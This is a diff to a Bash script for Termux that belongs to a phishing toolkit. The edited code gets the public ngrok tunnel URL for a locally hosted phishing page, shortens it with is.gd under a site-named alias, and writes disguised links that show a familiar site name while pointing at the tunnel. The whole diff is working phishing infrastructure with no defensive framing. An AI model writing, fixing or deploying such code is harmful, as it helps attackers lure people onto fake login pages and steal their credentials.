@@ -85,7 +85,7 @@ if [[ -a $PREFIX/bin/ngrok ]];then
 	end=$((SECONDS+60))
 	while [ $SECONDS -lt $end ];
 	do
-		control=$(curl -s http://127.0.0.1:4040/api/tunnels |grep -o \"https://[a-z.0-9.A-Z.]\*.ngrok.io\" |tr -d '"' |wc -l)
+		control=$(curl -s http://127.0.0.1:4040/api/tunnels |grep -o https://[^,]\*.ngrok.io |wc -l)
 		if [[ $control == 1 ]];then
 			break
 		fi
@@ -94,15 +94,15 @@ if [[ -a $PREFIX/bin/ngrok ]];then
 		am start -a android.intent.action.VIEW http://localhost:4444/phishing-tools/phishing_files/error.php
 		exit
 	fi
-	url=$(curl -s http://127.0.0.1:4040/api/tunnels |grep -o \"https://[a-z.0-9.A-Z.]\*.ngrok.io\" |tr -d '"')
-	domain=$(echo -e "$url" |grep -o /[a-z.0-9.A-Z.]\*.ngrok.io |tr -d '/')
-	special_link=$(curl -s -X POST "https://is.gd/create.php" -d url="$url" -d shorturl="$site_name$(date +%d%m%G%H%S)")
-	link3=$(echo -e "$special_link" |grep -o is.gd/[A-Z.a-z.0-9]\* |sed -n 1p)
+	url=$(curl -s http://127.0.0.1:4040/api/tunnels |grep -o https://[^,]\*.ngrok.io)
+	domain=$(echo -e "$url" |grep -o /[^,]\*.ngrok.io |tr -d '/')
+	special_link_source=$(curl -s -X POST "https://is.gd/create.php" -d url="$url" -d shorturl="$site_name$(date +%d%m%G%H%S)")
+	special_link=$(echo -e "$special_link_source" |grep -o is.gd/[^,]\*\" |tr -d '"' |awk -F ' ' '{print $1}' |sed -n 1p)
 	echo -e "
 	<a href=\"$url\">$url</a>
 	<a href=\"$url\">$site$domain</a>
-	<a href=\"$url\">$site$link3</a>
-	<a href=\"$url\">$(echo -e "$special_link" |grep -o https://is.gd/[A-Z.a-z.0-9]\* |sed -n 1p)</a>" > /data/data/com.termux/files/usr/lib/WIT/files/phishing-tools/phishing_files/links.txt
+	<a href=\"$url\">$site$special_link</a>
+	<a href=\"$url\">https://$special_link</a>" > /data/data/com.termux/files/usr/lib/WIT/files/phishing-tools/phishing_files/links.txt
 	exit
 
 else
@@ -175,7 +175,7 @@ if [[ $1 == --port || $1 == -p ]];then
 	end=$((SECONDS+60))
 	while [ $SECONDS -lt $end ];
 	do
-		control=$(curl -s http://127.0.0.1:4040/api/tunnels |grep -o \"https://[a-z.0-9.A-Z.]\*.ngrok.io\" |tr -d '"' |wc -l)
+		control=$(curl -s http://127.0.0.1:4040/api/tunnels |grep -o https://[^,]\*.ngrok.io |wc -l)
 		if [[ $control == 1 ]];then
 			break
 		fi
@@ -193,8 +193,8 @@ if [[ $1 == --port || $1 == -p ]];then
 	echo
 	echo
 	echo
-	url=$(curl -s http://127.0.0.1:4040/api/tunnels |grep -o \"https://[a-z.0-9.A-Z.]\*.ngrok.io\" |tr -d '"')
-	domain=$(echo -e "$url" |grep -o /[a-z.0-9.A-Z.]\*.ngrok.io |tr -d '/')
+	url=$(curl -s http://127.0.0.1:4040/api/tunnels |grep -o https://[^,]\*.ngrok.io)
+	domain=$(echo -e "$url" |grep -o /[^,]\*.ngrok.io |tr -d '/')
 	_information() {
 	clear
 	echo
@@ -216,16 +216,16 @@ if [[ $1 == --port || $1 == -p ]];then
 	echo
 	echo
 	printf "\e[1;31m[\e[97m2\e[31m]\e[97m $(cat information |sed -n 1p)$domain"
-	special_link=$(curl -s -X POST "https://is.gd/create.php" -d url="$url" -d shorturl="$(cat information |sed -n 2p)$(date +%d%m%G%H%S)")
-	link3=$(echo -e "$special_link" |grep -o is.gd/[A-Z.a-z.0-9]\* |sed -n 1p)
+	special_link_source=$(curl -s -X POST "https://is.gd/create.php" -d url="$url" -d shorturl="$(cat information |sed -n 2p)$(date +%d%m%G%H%S)")
+	special_link=$(echo -e "$special_link_source" |grep -o is.gd/[^,]\*\" |tr -d '"' |awk -F ' ' '{print $1}' |sed -n 1p)
 	echo
 	echo
 	echo
-	printf "\e[1;31m[\e[97m3\e[31m]\e[97m $(cat information |sed -n 1p)$link3 "
+	printf "\e[1;31m[\e[97m3\e[31m]\e[97m $(cat information |sed -n 1p)$special_link "
 	echo
 	echo
 	echo
-	printf "\e[1;31m[\e[97m4\e[31m]\e[97m $(echo -e "$special_link" |grep -o https://is.gd/[A-Z.a-z.0-9]\* |sed -n 1p)"
+	printf "\e[1;31m[\e[97m4\e[31m]\e[97m https://$special_link"
 	echo
 	echo
 	echo
